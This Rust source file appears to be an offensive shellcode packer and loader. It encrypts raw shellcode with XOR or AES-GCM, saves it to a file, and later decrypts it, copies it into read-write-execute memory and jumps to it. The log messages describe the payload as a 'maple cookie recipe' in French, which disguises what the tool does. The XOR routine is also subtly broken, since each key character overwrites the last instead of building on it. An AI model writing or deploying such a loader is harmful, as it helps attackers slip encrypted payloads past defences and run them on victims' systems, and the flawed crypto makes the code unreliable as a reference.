// ToBeatElite

use mmap_fixed::MapOption::*;
use std::fs::OpenOptions;
use std::io::Write;
use std::mem;

use serde_derive::{Deserialize, Serialize};

use aes_gcm::{
    aead::{AeadInPlace, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};

use rand::{
    distributions::{Alphanumeric, Uniform},
    Rng,
};

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ShellCode {
    pub sc: Vec<u8>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct XoredShellCode {
    pub sc: ShellCode,
    pub xor_key: String,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct AESShellCode {
    pub sc: ShellCode,
    pub nonce: Vec<u8>,
    pub assoc_data: Vec<u8>,
    pub key: Vec<u8>,
}

impl ShellCode {
    pub fn from_file(input_path: &str, mode: &str) -> anyhow::Result<ShellCode> {
        let shellcode = match std::fs::read(input_path) {
            Ok(result) => result,
            Err(error) => {
                println!(
                    "[+] n'a pas lu la recette des biscuits à l'érable : {:?}",
                    error
                );
                std::process::exit(0x0100);
            }
        };

        match mode {
            "xor" => {
                println!("[+] la recette des biscuits à l'érable dectected as XOR encrypted");
                let decoded_xor_object: XoredShellCode = bincode::deserialize(&shellcode)?;
                Ok(decoded_xor_object.xor())
            }
            "aes" => {
                println!(
                    "[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES"
                );
                let decoded_aes_object: AESShellCode =
                    bincode::deserialize(&shellcode)?;
                Ok(decoded_aes_object.decrypt())
            }
            "plain" => {
                println!("[+] la recette des biscuits à l'érable must be raw/normal");
                Ok(ShellCode { sc: shellcode })
            },
            &_ => todo!()
        }
    }

    pub fn load(self) {
        let map =
            mmap_fixed::MemoryMap::new(self.sc.len(), &[MapReadable, MapWritable, MapExecutable])
                .unwrap();

        unsafe {
            std::ptr::copy(self.sc.as_ptr(), map.data(), self.sc.len());
            println!(
                "[+] fixer les protections de la mémoire à {:p}",
                self.sc.as_ptr()
            );
            println!("{:?}", self.sc.as_ptr());
            let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
            println!("[+] commencer la recette des biscuits à l'érable");
            exec_shellcode();
        }
    }
}

impl XoredShellCode {
    pub fn new(sc_bytearray: ShellCode) -> XoredShellCode {
        let mut xored_shellcode = sc_bytearray.sc.clone();
        let xor_key: String = rand::thread_rng()
            .sample_iter(&Alphanumeric)
            .take(64)
            .map(char::from)
            .collect();

        println!("[+] encrypting la recette des biscuits à l'érable using XOR");
        println!(
            "[+] xor_key (first 5 bytes): {:#04X?}",
            xor_key.as_bytes().to_vec()[0..5].to_vec()
        );
        for xor_char in xor_key.chars() {
            if xor_char != ' ' {
                for (index, value) in sc_bytearray.sc.iter().enumerate() {
                    std::mem::replace(&mut xored_shellcode[index], value ^ (xor_char as u8 - b'0'));
                }
            }
        }

        XoredShellCode {
            xor_key: xor_key,
            sc: ShellCode {
                sc: xored_shellcode,
            },
        }
    }

    pub fn xor(self) -> ShellCode {
        let mut xored_shellcode = self.sc.sc.clone();
        println!("[+] cryptant la recette des cookies à l'érable en utilisant XOR");
        println!(
            "[+] xor_key (first 5 bytes): {:#04X?}",
            self.xor_key.as_bytes().to_vec()[0..5].to_vec()
        );
        for xor_char in self.xor_key.chars() {
            if xor_char != ' ' {
                for (index, value) in self.sc.sc.iter().enumerate() {
                    std::mem::replace(&mut xored_shellcode[index], value ^ xor_char as u8 - b'0');
                }
            }
        }

        ShellCode {
            sc: xored_shellcode,
        }
    }

    pub fn output_to_file(self, output_path: &str) {
        let serialized_self = bincode::serialize(&self).unwrap();

        println!("{:?}", serialized_self); // DEBUG
        let mut file = match OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(output_path.clone())
        {
            Ok(result) => result,
            Err(_error) => {
                println!("[+] le fichier de sortie existe déjà {}", output_path);
                std::process::exit(0x0100);
            }
        };

        file.write_all(&serialized_self).unwrap();
        println!(
            "[+] a écrit une recette de cookies à l'érable cryptée XOR en {}",
            output_path
        );
    }
}

impl AESShellCode {
    pub fn new(sc_bytearray: ShellCode) -> AESShellCode {
        let key = Aes256Gcm::generate_key(&mut OsRng).to_vec();
        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();

        let rand_assoc_data: Vec<u8> = rand::thread_rng()
            .sample_iter(Uniform::from(1..255))
            .take(64)
            .collect();
        let rand_nonce: Vec<u8> = rand::thread_rng()
            .sample_iter(Uniform::from(1..255))
            .take(12)
            .collect();
        let nonce = Nonce::from_slice(&rand_nonce);

        let mut sc_copy = sc_bytearray;
        cipher.encrypt_in_place(nonce, &rand_assoc_data, &mut sc_copy.sc);

        println!("[+] cryptant la recette des cookies à l'érable en utilisant AES");
        println!(
            "[+] key: (first 5 bytes) {:#04X?}",
            key.clone()[0..5].to_vec()
        );
        println!(
            "[+] nonce: (first 5 bytes) {:#04X?}",
            rand_nonce.clone()[0..5].to_vec()
        );
        println!(
            "[+] assoc_data: (first 5 bytes) {:#04X?}",
            rand_assoc_data.clone()[0..5].to_vec()
        );

        AESShellCode {
            sc: sc_copy,
            nonce: rand_nonce,
            assoc_data: rand_assoc_data,
            key,
        }
    }

    pub fn decrypt(mut self) -> ShellCode {
        println!("[+] décryptage de la recette des cookies à l'érable en utilisant AES");
        println!("[+] key: (first 5 bytes) {:#04X?}", self.key[0..5].to_vec());
        println!(
            "[+] nonce: (first 5 bytes) {:#04X?}",
            self.nonce[0..5].to_vec()
        );
        println!(
            "[+] assoc_data: (first 5 bytes) {:#04X?}",
            self.assoc_data[0..5].to_vec()
        );

        let cipher = Aes256Gcm::new_from_slice(&self.key).unwrap();
        let nonce = Nonce::from_slice(&self.nonce);
        cipher.decrypt_in_place(nonce, &self.assoc_data, &mut self.sc.sc);

        self.sc
    }

    pub fn output_to_file(self, output_path: &str) {
        let serialized_self = bincode::serialize(&self).unwrap();

        let mut file = match OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(output_path.clone())
        {
            Ok(result) => result,
            Err(_error) => {
                println!("[+] le fichier de sortie existe déjà {}", output_path);
                std::process::exit(0x0100);
            }
        };

        file.write_all(&serialized_self).unwrap();
        println!(
            "[+] a écrit une recette de cookies à l'érable cryptée AES en {}",
            output_path
        );
    }
}
